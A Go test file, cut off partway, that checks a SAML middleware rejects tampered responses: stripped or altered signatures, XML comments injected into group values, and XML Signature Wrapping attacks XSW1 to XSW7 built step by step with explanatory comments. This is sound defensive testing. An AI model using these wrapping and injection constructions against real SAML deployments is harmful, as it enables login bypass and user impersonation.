package saml_test

import (
	"fmt"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"
	"time"

	"github.com/beevik/etree"
	"github.com/crewjam/saml"
	"github.com/instana/testify/require"
	"gotest.tools/assert"
	is "gotest.tools/assert/cmp"
)

func TestMiddlewareCanParseResponse(t *testing.T) {
	t.Run("case=happy path", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl
		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// This is the Happy Path, the HTTP response code should be 302 (Found status)
		assert.Check(t, is.Equal(http.StatusFound, resp.Code))
	})

	t.Run("case=add saml response attribute", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl

		// Add an attribute to the Response
		responseEl.CreateAttr("newAttr", "randomValue")

		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// The SAML Response has been modified, the signature is invalid, so the HTTP Response code is 403 (Forbidden status)
		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	t.Run("case=add saml response element", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl

		// Add an attribute to the Response
		responseEl.CreateElement("newEl")

		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// The SAML Response has been modified, the signature is invalid, so the HTTP Response code is 403 (Forbidden status)
		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	t.Run("case=change saml response indent", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl
		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Change the document indentation
		doc.Indent(2)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// The SAML Response has been modified, the signature is invalid, so the HTTP Response code is 403 (Forbidden status)
		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	t.Run("case=add saml assertion attribute", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl
		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Remove the whole Signature element
		RemoveResponseSignature(doc)

		// Get and Decrypt SAML Assertion
		decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

		// Add an attribute to the Response
		decryptedAssertion.CreateAttr("newAttr", "randomValue")

		// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
		ReplaceResponseAssertion(t, responseEl, decryptedAssertion)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// Either the SAML Response or the SAML Assertion must be signed, so the HTTP Response code is 403 (Forbidden status)
		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	t.Run("case=add saml assertion element", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl
		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Remove the whole Signature element
		RemoveResponseSignature(doc)

		// Get and Decrypt SAML Assertion
		decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

		// Add an attribute to the Response
		decryptedAssertion.CreateElement("newEl")

		// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
		ReplaceResponseAssertion(t, responseEl, decryptedAssertion)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// Either the SAML Response or the SAML Assertion must be signed, so the HTTP Response code is 403 (Forbidden status)
		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	t.Run("case=remove saml response signature value", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl

		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Remove SignatureValue element of Signature element
		signatureValueEl := doc.FindElement("//Signature/SignatureValue")
		signatureValueEl.Parent().RemoveChild(signatureValueEl)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// The SAML Response signature value can't be removed, so the HTTP Response code is 403 (Forbidden status)
		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	t.Run("case=remove saml response signature", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl

		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Remove the whole Signature element
		signatureValueEl := doc.FindElement("//Signature")
		signatureValueEl.Parent().RemoveChild(signatureValueEl)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// The SAML Response signature has been removed but the SAML Assertion is still signed
		assert.Check(t, is.Equal(http.StatusFound, resp.Code))
	})

	t.Run("case=remove saml assertion signature value", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl
		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Remove the whole Signature element
		RemoveResponseSignature(doc)

		// Get and Decrypt SAML Assertion
		decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

		// Remove the Signature Value from the decrypted assertion
		signatureValueEl := decryptedAssertion.FindElement("//Signature/SignatureValue")
		signatureValueEl.Parent().RemoveChild(signatureValueEl)

		// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
		ReplaceResponseAssertion(t, responseEl, decryptedAssertion)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// The SAML Assertion signature value can't be removed, so the HTTP Response code is 403 (Forbidden status)
		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	t.Run("case=remove saml assertion signature", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl
		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Remove the whole Signature element
		RemoveResponseSignature(doc)

		// Get and Decrypt SAML Assertion
		decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

		// Remove the Signature Value from the decrypted assertion
		signatureEl := decryptedAssertion.FindElement("//Signature")
		signatureEl.Parent().RemoveChild(signatureEl)

		// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
		ReplaceResponseAssertion(t, responseEl, decryptedAssertion)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// The SAML Assertion signature has been removed but the SAML Response is still signed
		// The SAML Response has been modified, the SAML Response signature is invalid, so the HTTP Response code is 403 (Forbidden status)
		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	t.Run("case=remove both saml response signature and saml assertion signature value", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		responseEl := authnRequest.ResponseEl
		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Remove the whole Signature element
		RemoveResponseSignature(doc)

		// Get and Decrypt SAML Assertion
		decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

		// Remove the Signature Value from the decrypted assertion
		assertionSignatureEl := decryptedAssertion.FindElement("//Signature")
		assertionSignatureEl.Parent().RemoveChild(assertionSignatureEl)

		// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
		ReplaceResponseAssertion(t, responseEl, decryptedAssertion)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// Either the SAML Response or the SAML Assertion must be signed, so the HTTP Response code is 403 (Forbidden status)
		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	t.Run("case=add xml comments in saml attributes", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		groups := []string{"admin@test.ovh", "not-adminc@test.ovh", "regular@test.ovh", "manager@test.ovh"}
		evilGroups := []string{"<!--comment-->admin@test.ovh", "not-<!--comment-->adminc@test.ovh", "regular@test.ovh<!--comment-->", "<!--comment-->manager<!--comment-->@test.ovh<!--comment-->"}

		// User session
		userSession := &saml.Session{
			ID:       "f00df00df00d",
			UserName: "alice",
			Groups:   groups,
		}

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponseWithSession(t, testMiddleware, authnRequest, authnRequestID, userSession)

		// Get Response Element
		responseEl := authnRequest.ResponseEl
		doc := etree.NewDocument()
		doc.SetRoot(responseEl)

		// Remove the whole Signature element
		RemoveResponseSignature(doc)

		// Get and Decrypt SAML Assertion
		decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, doc)

		// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
		ReplaceResponseAssertion(t, responseEl, decryptedAssertion)

		// Get Reponse string
		responseStr, err := doc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		// Either the SAML Response or the SAML Assertion must be signed, so the HTTP Response code is 403 (Forbidden status)
		assert.Check(t, is.Equal(http.StatusFound, resp.Code))

		// We parse the SAML Response to get the SAML Assertion
		assertion, err := testMiddleware.Middleware.ServiceProvider.ParseResponse(req, []string{authnRequestID})
		require.NoError(t, err)

		// We get the user's attributes from the SAML Response (assertion)
		attributes, err := strategy.GetAttributesFromAssertion(assertion)
		require.NoError(t, err)

		assertionGroups := attributes["urn:oid:1.3.6.1.4.1.5923.1.1.1.1"]
		for i := 0; i < len(assertionGroups); i++ {
			splittedEvilGroup := Delete(strings.Split(evilGroups[i], "<!--comment-->"), "")
			if len(splittedEvilGroup) == 1 {
				continue
			}
			for j := 0; j < len(splittedEvilGroup); j++ {
				assert.Assert(t, assertionGroups[i] != splittedEvilGroup[j])
			}
		}

	})
	// More information about the 9 next tests about XSW attacks:
	// https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two

	// XSW #1 manipulates SAML Responses.
	// It does this by making a copy of the SAML Response and Assertion,
	// then inserting the original Signature into the XML as a child element of the copied Response.
	// The assumption being that the XML parser finds and uses the copied Response at the top of
	// the document after signature validation instead of the original signed Response.
	t.Run("case=xsw1 response wrap 1", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		evilResponseEl := authnRequest.ResponseEl
		evilResponseDoc := etree.NewDocument()
		evilResponseDoc.SetRoot(evilResponseEl)

		// Copy the Response Element
		// This copy will not be changed and contain the original Response content
		originalResponseEl := evilResponseEl.Copy()
		originalResponseDoc := etree.NewDocument()
		originalResponseDoc.SetRoot(originalResponseEl)

		// Remove the whole Signature element of the copied Response Element
		RemoveResponseSignature(originalResponseDoc)

		// Get the original Response Signature element
		evilResponseDoc.FindElement("//Signature").AddChild(originalResponseEl)

		// Modify the ID attribute of the original Response Element
		evilResponseEl.RemoveAttr("ID")
		evilResponseEl.CreateAttr("ID", "id-evil")

		// Get Reponse string
		responseStr, err := evilResponseDoc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	// Similar to XSW #1, XSW #2 manipulates SAML Responses.
	// The key difference between #1 and #2 is that the type of Signature used is a detached signature where XSW #1 used an enveloping signature.
	// The location of the malicious Response remains the same.
	t.Run("case=xsw2 response wrap 2", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		evilResponseEl := authnRequest.ResponseEl
		evilResponseDoc := etree.NewDocument()
		evilResponseDoc.SetRoot(evilResponseEl)

		// Copy the Response Element
		// This copy will not be changed and contain the original Response content
		originalResponseEl := evilResponseEl.Copy()
		originalResponseDoc := etree.NewDocument()
		originalResponseDoc.SetRoot(originalResponseEl)

		// Remove the whole Signature element of the copied Response Element
		RemoveResponseSignature(originalResponseDoc)

		// We put the orignal response and its signature on the same level, just under the evil reponse
		evilResponseDoc.FindElement("//Response").AddChild(originalResponseEl)
		evilResponseDoc.FindElement("//Response").AddChild(evilResponseDoc.FindElement("//Signature"))

		// Modify the ID attribute of the original Response Element
		evilResponseEl.RemoveAttr("ID")
		evilResponseEl.CreateAttr("ID", "id-evil")

		// Get Reponse string
		responseStr, err := evilResponseDoc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		assert.Check(t, is.Equal(http.StatusForbidden, resp.Code))
	})

	// XSW #3 is the first example of an XSW that wraps the Assertion element.
	// It inserts the copied Assertion as the first child of the root Response element.
	// The original Assertion is a sibling of the copied Assertion.
	t.Run("case=xsw3 assertion wrap 1", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, strategy, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		evilResponseEl := authnRequest.ResponseEl
		evilResponseDoc := etree.NewDocument()
		evilResponseDoc.SetRoot(evilResponseEl)

		// Get and Decrypt SAML Assertion
		decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)

		// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
		ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)

		// Copy the Response Element
		// This copy will not be changed and contain the original Response content
		originalResponseEl := evilResponseEl.Copy()
		originalResponseDoc := etree.NewDocument()
		originalResponseDoc.SetRoot(originalResponseEl)

		RemoveResponseSignature(evilResponseDoc)

		// We have to delete the signature of the evil assertion
		RemoveAssertionSignature(evilResponseDoc)
		evilResponseDoc.FindElement("//Assertion").RemoveAttr("ID")
		evilResponseDoc.FindElement("//Assertion").CreateAttr("ID", "id-evil")

		evilResponseDoc.FindElement("//Response").AddChild(originalResponseDoc.FindElement("//Assertion"))

		evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil-alice")

		// Get Reponse string
		responseStr, err := evilResponseDoc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		assertion, err := testMiddleware.Middleware.ServiceProvider.ParseResponse(req, []string{authnRequestID})
		require.NoError(t, err)

		// We get the user's attributes from the SAML Response (assertion)
		attributes, err := strategy.GetAttributesFromAssertion(assertion)
		require.NoError(t, err)

		// Now we have to check that either the assertion does not pass, or that the attributes do not contain the injected attribute
		assert.Check(t, (resp.Code == http.StatusFound && attributes["urn:oid:0.9.2342.19200300.100.1.1"][0] == "alice") || resp.Code == http.StatusForbidden)
	})

	// XSW #4 is similar to #3, except in this case the original Assertion becomes a child of the copied Assertion.
	t.Run("case=xsw4 assertion wrap 2", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		evilResponseEl := authnRequest.ResponseEl
		evilResponseDoc := etree.NewDocument()
		evilResponseDoc.SetRoot(evilResponseEl)

		// Get and Decrypt SAML Assertion
		decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)

		// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
		ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)

		// Copy the Response Element
		// This copy will not be changed and contain the original Response content
		originalResponseEl := evilResponseEl.Copy()
		originalResponseDoc := etree.NewDocument()
		originalResponseDoc.SetRoot(originalResponseEl)

		RemoveResponseSignature(evilResponseDoc)

		// We have to delete the signature of the evil assertion
		RemoveAssertionSignature(evilResponseDoc)
		evilResponseDoc.FindElement("//Assertion").RemoveAttr("ID")
		evilResponseDoc.FindElement("//Assertion").CreateAttr("ID", "id-evil")

		evilResponseDoc.FindElement("//Assertion").AddChild(originalResponseDoc.FindElement("//Assertion"))

		// Change the username
		evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil-alice")

		// Get Reponse string
		responseStr, err := evilResponseDoc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		_, err = testMiddleware.Middleware.ServiceProvider.ParseResponse(req, []string{authnRequestID})
		require.Error(t, err)

		// Now we have to check that either the assertion does not pass, or that the attributes do not contain the injected attribute
		assert.Check(t, resp.Code == http.StatusForbidden)
	})

	// XSW #5 is the first instance of Assertion wrapping we see where the Signature and the original Assertion aren’t in one of the three standard configurations (enveloped/enveloping/detached).
	// In this case, the copied Assertion envelopes the Signature.
	t.Run("case=xsw5 assertion wrap 3", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		evilResponseEl := authnRequest.ResponseEl
		evilResponseDoc := etree.NewDocument()
		evilResponseDoc.SetRoot(evilResponseEl)

		// Get and Decrypt SAML Assertion
		decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)

		// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
		ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)

		// Copy the Response Element
		// This copy will not be changed and contain the original Response content
		originalResponseEl := evilResponseEl.Copy()
		originalResponseDoc := etree.NewDocument()
		originalResponseDoc.SetRoot(originalResponseEl)

		RemoveResponseSignature(evilResponseDoc)

		evilResponseDoc.FindElement("//Assertion").RemoveAttr("ID")
		evilResponseDoc.FindElement("//Assertion").CreateAttr("ID", "id-evil")

		RemoveAssertionSignature(originalResponseDoc)
		evilResponseDoc.FindElement("//Response").AddChild(originalResponseDoc.FindElement("//Assertion"))

		// Change the username
		evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil-alice")

		// Get Reponse string
		responseStr, err := evilResponseDoc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		_, err = testMiddleware.Middleware.ServiceProvider.ParseResponse(req, []string{authnRequestID})
		require.Error(t, err)

		assert.Check(t, (resp.Code == http.StatusForbidden))
	})

	// XSW #6 inserts its copied Assertion into the same location as #’s 4 and 5.
	// The interesting piece here is that the copied Assertion envelopes the Signature, which in turn envelopes the original Assertion.
	t.Run("case=xsw6 assertion wrap 4", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		evilResponseEl := authnRequest.ResponseEl
		evilResponseDoc := etree.NewDocument()
		evilResponseDoc.SetRoot(evilResponseEl)

		// Get and Decrypt SAML Assertion
		decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)

		// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
		ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)

		// Copy the Response Element
		// This copy will not be changed and contain the original Response content
		originalResponseEl := evilResponseEl.Copy()
		originalResponseDoc := etree.NewDocument()
		originalResponseDoc.SetRoot(originalResponseEl)

		RemoveResponseSignature(evilResponseDoc)

		evilResponseDoc.FindElement("//Assertion").RemoveAttr("ID")
		evilResponseDoc.FindElement("//Assertion").CreateAttr("ID", "id-evil")

		RemoveAssertionSignature(originalResponseDoc)
		evilResponseDoc.FindElement("//Assertion").FindElement("//Signature").AddChild(originalResponseDoc.FindElement("//Assertion"))

		// Change the username
		evilResponseDoc.FindElement("//Response/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil-alice")

		// Get Reponse string
		responseStr, err := evilResponseDoc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		_, err = testMiddleware.Middleware.ServiceProvider.ParseResponse(req, []string{authnRequestID})
		require.Error(t, err)

		// Now we have to check that either the assertion does not pass, or that the attributes do not contain the injected attribute
		assert.Check(t, (resp.Code == http.StatusForbidden))
	})

	// XSW #7 inserts an Extensions element and adds the copied Assertion as a child. Extensions is a valid XML element with a less restrictive schema definition.
	t.Run("case=xsw7 assertion wrap 5", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		evilResponseEl := authnRequest.ResponseEl
		evilResponseDoc := etree.NewDocument()
		evilResponseDoc.SetRoot(evilResponseEl)

		// Get and Decrypt SAML Assertion
		decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)

		// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
		ReplaceResponseAssertion(t, evilResponseEl, decryptedAssertion)

		// Copy the Response Element
		// This copy will not be changed and contain the original Response content
		originalResponseEl := evilResponseEl.Copy()
		originalResponseDoc := etree.NewDocument()
		originalResponseDoc.SetRoot(originalResponseEl)

		RemoveResponseSignature(evilResponseDoc)

		// We have to delete the signature of the evil assertion
		RemoveAssertionSignature(evilResponseDoc)

		evilResponseDoc.FindElement("//Response").AddChild(etree.NewElement("Extension"))
		evilResponseDoc.FindElement("//Response").FindElement("//Extension").AddChild(evilResponseDoc.FindElement("//Assertion"))
		evilResponseDoc.FindElement("//Response").AddChild(originalResponseDoc.FindElement("//Assertion"))

		// Change the username
		evilResponseDoc.FindElement("//Response/Extension/Assertion/AttributeStatement/Attribute/AttributeValue").SetText("evil-alice")

		// Get Reponse string
		responseStr, err := evilResponseDoc.WriteToString()
		assert.NilError(t, err)

		req := PrepareTestSAMLResponseHTTPRequest(t, testMiddleware, authnRequest, authnRequestID, responseStr)

		// Send the SAML Response to the SP ACS
		resp := httptest.NewRecorder()
		testMiddleware.Middleware.ServeHTTP(resp, req)

		_, err = testMiddleware.Middleware.ServiceProvider.ParseResponse(req, []string{authnRequestID})
		require.Error(t, err)

		// Now we have to check that either the assertion does not pass, or that the attributes do not contain the injected attribute
		assert.Check(t, resp.Code == http.StatusForbidden)
	})

	// XSW #8 uses another less restrictive XML element to perform a variation of the attack pattern used in XSW #7.
	// This time around the original Assertion is the child of the less restrictive element instead of the copied Assertion.
	t.Run("case=xsw8 assertion wrap 6", func(t *testing.T) {
		// Create the SP, the IdP and the AnthnRequest
		testMiddleware, _, _, authnRequest, authnRequestID := prepareTestEnvironment(t)

		// Generate the SAML Assertion and the SAML Response
		authnRequest = PrepareTestSAMLResponse(t, testMiddleware, authnRequest, authnRequestID)

		// Get Response Element
		evilResponseEl := authnRequest.ResponseEl
		evilResponseDoc := etree.NewDocument()
		evilResponseDoc.SetRoot(evilResponseEl)

		// Get and Decrypt SAML Assertion
		decryptedAssertion := GetAndDecryptAssertionEl(t, testMiddleware, evilResponseDoc)

		// Replace the SAML crypted Assertion in the SAML Response by SAML decrypted Assertion
